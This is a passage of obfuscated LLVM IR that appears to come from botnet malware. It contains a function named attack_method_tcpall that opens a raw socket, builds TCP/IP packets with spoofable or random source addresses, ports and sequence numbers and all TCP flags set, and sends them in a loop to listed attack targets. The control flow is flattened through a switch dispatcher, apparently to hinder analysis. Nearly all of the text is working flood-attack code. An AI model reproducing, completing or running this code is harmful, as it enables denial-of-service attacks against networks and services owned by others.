  %343 = icmp eq i32 %342, -1
  %344 = select i1 %343, i32 -1361195060, i32 -1377994184
  store i32 %344, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = call i32 @rand_next()
  %347 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 8
  store i32 %346, i32* %348, align 4
  store i32 -1377994184, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i16, i16* %13, align 2
  %351 = zext i16 %350 to i32
  %352 = icmp eq i32 %351, 65535
  %353 = select i1 %352, i32 1905100515, i32 -822080514
  store i32 %353, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = call i32 @rand_next()
  %356 = and i32 %355, 65535
  %357 = trunc i32 %356 to i16
  %358 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 3
  store i16 %357, i16* %359, align 4
  store i32 -822080514, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i16, i16* %16, align 2
  %362 = zext i16 %361 to i32
  %363 = icmp eq i32 %362, 65535
  %364 = select i1 %363, i32 -1288783676, i32 16261829
  store i32 %364, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %366 = call i32 @rand_next()
  %367 = and i32 %366, 65535
  %368 = trunc i32 %367 to i16
  %369 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %370 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %369, i32 0, i32 0
  store i16 %368, i16* %370, align 4
  store i32 16261829, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load i16, i16* %17, align 2
  %373 = zext i16 %372 to i32
  %374 = icmp eq i32 %373, 65535
  %375 = select i1 %374, i32 1645859560, i32 1520353685
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = call i32 @rand_next()
  %378 = and i32 %377, 65535
  %379 = trunc i32 %378 to i16
  %380 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %381 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %380, i32 0, i32 1
  store i16 %379, i16* %381, align 2
  store i32 1520353685, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i32, i32* %18, align 4
  %384 = icmp eq i32 %383, 65535
  %385 = select i1 %384, i32 -1449095219, i32 509762412
  store i32 %385, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = call i32 @rand_next()
  %388 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 2
  store i32 %387, i32* %389, align 4
  store i32 509762412, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %19, align 4
  %392 = icmp eq i32 %391, 65535
  %393 = select i1 %392, i32 -1067120953, i32 -1824033894
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 @rand_next()
  %396 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 3
  store i32 %395, i32* %397, align 4
  store i32 -1824033894, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8, i8* %20, align 1
  %400 = icmp ne i8 %399, 0
  %401 = select i1 %400, i32 -814721806, i32 424649264
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = call i32 @rand_next()
  %404 = and i32 %403, 65535
  %405 = trunc i32 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 7
  store i16 %405, i16* %407, align 2
  store i32 424649264, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  %409 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 0, i16* %410, align 2
  %411 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %412 = bitcast %struct.iphdr* %411 to i16*
  %413 = call zeroext i16 @checksum_generic(i16* %412, i32 20)
  %414 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  %416 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 6
  store i16 0, i16* %417, align 4
  %418 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %419 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %420 = bitcast %struct.tcphdr* %419 to i8*
  %421 = call zeroext i16 @htons(i16 zeroext 40) #7
  %422 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %418, i8* %420, i16 zeroext %421, i32 40)
  %423 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 6
  store i16 %422, i16* %424, align 4
  %425 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 1
  %427 = load i16, i16* %426, align 2
  %428 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %429 = load i32, i32* %9, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %428, i64 %430
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i32 0, i32 0
  %433 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %432, i32 0, i32 1
  store i16 %427, i16* %433, align 2
  %434 = load i32, i32* %10, align 4
  %435 = load i8*, i8** %30, align 8
  %436 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %437 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i64 %439
  %441 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i32 0, i32 0
  %442 = bitcast %struct.sockaddr_in* %441 to %struct.sockaddr*
  store %struct.sockaddr* %442, %struct.sockaddr** %436, align 8
  %443 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %444 = load %struct.sockaddr*, %struct.sockaddr** %443, align 8
  %445 = call i64 @sendto(i32 %434, i8* %435, i64 60, i32 16384, %struct.sockaddr* %444, i32 16)
  store i32 595019086, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  %447 = load i32, i32* %9, align 4
  %448 = add nsw i32 %447, 1
  store i32 %448, i32* %9, align 4
  store i32 -692316888, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  store i32 -1298656835, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %449, %446, %408, %402, %398, %394, %390, %386, %382, %376, %371, %365, %360, %354, %349, %345, %341, %320, %300, %294, %293, %292, %289, %164, %160, %116, %110, %109, %106, %100, %99, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpall(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 1)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 73196222, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 73196222, label %first
    i32 39512428, label %99
    i32 478306597, label %100
    i32 -1435421343, label %106
    i32 -1142483364, label %109
    i32 -1950211883, label %110
    i32 1443479155, label %116
    i32 1013128888, label %160
    i32 741858913, label %164
    i32 -1059147934, label %289
    i32 -1275747144, label %292
    i32 1078236150, label %293
    i32 -6909772, label %294
    i32 -21375562, label %300
    i32 -1644646913, label %320
    i32 790982891, label %341
    i32 1774716386, label %345
    i32 -1405771242, label %349
    i32 -1408255016, label %354
    i32 799299044, label %360
    i32 740646121, label %365
    i32 917209257, label %371
    i32 1746448859, label %376
    i32 174321538, label %382
    i32 -870797642, label %386
    i32 953806507, label %390
    i32 -849303975, label %394
    i32 -373260021, label %398
    i32 1841991243, label %402
    i32 -390522898, label %408
    i32 -2142306109, label %446
    i32 -2105126509, label %449
    i32 744036097, label %450
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %97 = icmp eq i32 %.reload, -1
  %98 = select i1 %97, i32 39512428, i32 478306597
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  store i32 744036097, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %101 = load i32, i32* %10, align 4
  %102 = bitcast i32* %9 to i8*
  %103 = call i32 @setsockopt(i32 %101, i32 0, i32 3, i8* %102, i32 4) #6
  %104 = icmp eq i32 %103, -1
  %105 = select i1 %104, i32 -1435421343, i32 -1142483364
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %10, align 4
  %108 = call i32 @close(i32 %107)
  store i32 744036097, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1950211883, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %9, align 4
  %112 = load i8, i8* %5, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp slt i32 %111, %113
  %115 = select i1 %114, i32 1443479155, i32 -1275747144
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call noalias i8* @calloc(i64 128, i64 1) #6
  %118 = load i8**, i8*** %11, align 8
  %119 = load i32, i32* %9, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8*, i8** %118, i64 %120
  store i8* %117, i8** %121, align 8
  %122 = load i8**, i8*** %11, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds i8*, i8** %122, i64 %124
  %126 = load i8*, i8** %125, align 8
  %127 = bitcast i8* %126 to %struct.iphdr*
  store %struct.iphdr* %127, %struct.iphdr** %27, align 8
  %128 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i64 1
  %130 = bitcast %struct.iphdr* %129 to %struct.tcphdr*
  store %struct.tcphdr* %130, %struct.tcphdr** %28, align 8
  %131 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %132 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %131, i64 1
  %133 = bitcast %struct.tcphdr* %132 to i8*
  store i8* %133, i8** %29, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %135 = bitcast %struct.iphdr* %134 to i8*
  %136 = load i8, i8* %135, align 4
  %137 = and i8 %136, 15
  %138 = or i8 %137, 64
  store i8 %138, i8* %135, align 4
  %139 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, -16
  %143 = or i8 %142, 5
  store i8 %143, i8* %140, align 4
  %144 = load i8, i8* %12, align 1
  %145 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 1
  store i8 %144, i8* %146, align 1
  %147 = call zeroext i16 @htons(i16 zeroext 60) #7
  %148 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 2
  store i16 %147, i16* %149, align 2
  %150 = load i16, i16* %13, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 3
  store i16 %151, i16* %153, align 4
  %154 = load i8, i8* %14, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 5
  store i8 %154, i8* %156, align 4
  %157 = load i8, i8* %15, align 1
  %158 = icmp ne i8 %157, 0
  %159 = select i1 %158, i32 1013128888, i32 741858913
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 4
  store i16 %161, i16* %163, align 2
  store i32 741858913, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 6
  store i8 6, i8* %166, align 1
  %167 = load i32, i32* %26, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 8
  store i32 %167, i32* %169, align 4
  %170 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %171 = load i32, i32* %9, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i64 %172
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i32 0, i32 1
  %175 = load i32, i32* %174, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 9
  store i32 %175, i32* %177, align 4
  %178 = load i16, i16* %16, align 2
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 0
  store i16 %179, i16* %181, align 4
  %182 = load i16, i16* %17, align 2
  %183 = call zeroext i16 @htons(i16 zeroext %182) #7
  %184 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 1
  store i16 %183, i16* %185, align 2
  %186 = load i32, i32* %18, align 4
  %187 = trunc i32 %186 to i16
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = zext i16 %188 to i32
  %190 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 2
  store i32 %189, i32* %191, align 4
  %192 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -241
  %196 = or i16 %195, 160
  store i16 %196, i16* %193, align 4
  %197 = load i8, i8* %20, align 1
  %198 = sext i8 %197 to i16
  %199 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %199, i32 0, i32 4
  %201 = load i16, i16* %200, align 4
  %202 = and i16 %198, 1
  %203 = shl i16 %202, 13
  %204 = and i16 %201, -8193
  %205 = or i16 %204, %203
  store i16 %205, i16* %200, align 4
  %206 = load i8, i8* %21, align 1
  %207 = sext i8 %206 to i16
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 4
  %210 = load i16, i16* %209, align 4
  %211 = and i16 %207, 1
  %212 = shl i16 %211, 12
  %213 = and i16 %210, -4097
  %214 = or i16 %213, %212
  store i16 %214, i16* %209, align 4
  %215 = load i8, i8* %22, align 1
  %216 = sext i8 %215 to i16
  %217 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %216, 1
  %221 = shl i16 %220, 11
  %222 = and i16 %219, -2049
  %223 = or i16 %222, %221
  store i16 %223, i16* %218, align 4
  %224 = load i8, i8* %23, align 1
  %225 = sext i8 %224 to i16
  %226 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %225, 1
  %230 = shl i16 %229, 10
  %231 = and i16 %228, -1025
  %232 = or i16 %231, %230
  store i16 %232, i16* %227, align 4
  %233 = load i8, i8* %24, align 1
  %234 = sext i8 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 4
  %237 = load i16, i16* %236, align 4
  %238 = and i16 %234, 1
  %239 = shl i16 %238, 9
  %240 = and i16 %237, -513
  %241 = or i16 %240, %239
  store i16 %241, i16* %236, align 4
  %242 = load i8, i8* %25, align 1
  %243 = sext i8 %242 to i16
  %244 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = and i16 %243, 1
  %248 = shl i16 %247, 8
  %249 = and i16 %246, -257
  %250 = or i16 %249, %248
  store i16 %250, i16* %245, align 4
  %251 = load i8*, i8** %29, align 8
  %252 = getelementptr inbounds i8, i8* %251, i32 1
  store i8* %252, i8** %29, align 8
  store i8 2, i8* %251, align 1
  %253 = load i8*, i8** %29, align 8
  %254 = getelementptr inbounds i8, i8* %253, i32 1
  store i8* %254, i8** %29, align 8
  store i8 4, i8* %253, align 1
  %255 = call i32 @rand_next()
  %256 = and i32 %255, 15
  %257 = add i32 1400, %256
  %258 = trunc i32 %257 to i16
  %259 = call zeroext i16 @htons(i16 zeroext %258) #7
  %260 = load i8*, i8** %29, align 8
  %261 = bitcast i8* %260 to i16*
  store i16 %259, i16* %261, align 2
  %262 = load i8*, i8** %29, align 8
  %263 = getelementptr inbounds i8, i8* %262, i64 2
  store i8* %263, i8** %29, align 8
  %264 = load i8*, i8** %29, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %29, align 8
  store i8 4, i8* %264, align 1
  %266 = load i8*, i8** %29, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %29, align 8
  store i8 2, i8* %266, align 1
  %268 = load i8*, i8** %29, align 8
  %269 = getelementptr inbounds i8, i8* %268, i32 1
  store i8* %269, i8** %29, align 8
  store i8 8, i8* %268, align 1
  %270 = load i8*, i8** %29, align 8
  %271 = getelementptr inbounds i8, i8* %270, i32 1
  store i8* %271, i8** %29, align 8
  store i8 10, i8* %270, align 1
  %272 = call i32 @rand_next()
  %273 = load i8*, i8** %29, align 8
  %274 = bitcast i8* %273 to i32*
  store i32 %272, i32* %274, align 4
  %275 = load i8*, i8** %29, align 8
  %276 = getelementptr inbounds i8, i8* %275, i64 4
  store i8* %276, i8** %29, align 8
  %277 = load i8*, i8** %29, align 8
  %278 = bitcast i8* %277 to i32*
  store i32 0, i32* %278, align 4
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i64 4
  store i8* %280, i8** %29, align 8
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 1, i8* %281, align 1
  %283 = load i8*, i8** %29, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %29, align 8
  store i8 3, i8* %283, align 1
  %285 = load i8*, i8** %29, align 8
  %286 = getelementptr inbounds i8, i8* %285, i32 1
  store i8* %286, i8** %29, align 8
  store i8 3, i8* %285, align 1
  %287 = load i8*, i8** %29, align 8
  %288 = getelementptr inbounds i8, i8* %287, i32 1
  store i8* %288, i8** %29, align 8
  store i8 6, i8* %287, align 1
  store i32 -1059147934, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i32, i32* %9, align 4
  %291 = add nsw i32 %290, 1
  store i32 %291, i32* %9, align 4
  store i32 -1950211883, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  store i32 1078236150, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -6909772, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %9, align 4
  %296 = load i8, i8* %5, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp slt i32 %295, %297
  %299 = select i1 %298, i32 -21375562, i32 -2105126509
  store i32 %299, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  %301 = load i8**, i8*** %11, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  %305 = load i8*, i8** %304, align 8
  store i8* %305, i8** %30, align 8
  %306 = load i8*, i8** %30, align 8
  %307 = bitcast i8* %306 to %struct.iphdr*
  store %struct.iphdr* %307, %struct.iphdr** %31, align 8
  %308 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i64 1
  %310 = bitcast %struct.iphdr* %309 to %struct.tcphdr*
  store %struct.tcphdr* %310, %struct.tcphdr** %32, align 8
  %311 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 2
  %316 = load i8, i8* %315, align 4
  %317 = zext i8 %316 to i32
  %318 = icmp slt i32 %317, 32
  %319 = select i1 %318, i32 -1644646913, i32 790982891
  store i32 %319, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %321, i64 %323
  %325 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %324, i32 0, i32 1
  %326 = load i32, i32* %325, align 4
  %327 = call i32 @ntohl(i32 %326) #7
  %328 = call i32 @rand_next()
  %329 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i32 0, i32 2
  %334 = load i8, i8* %333, align 4
  %335 = zext i8 %334 to i32
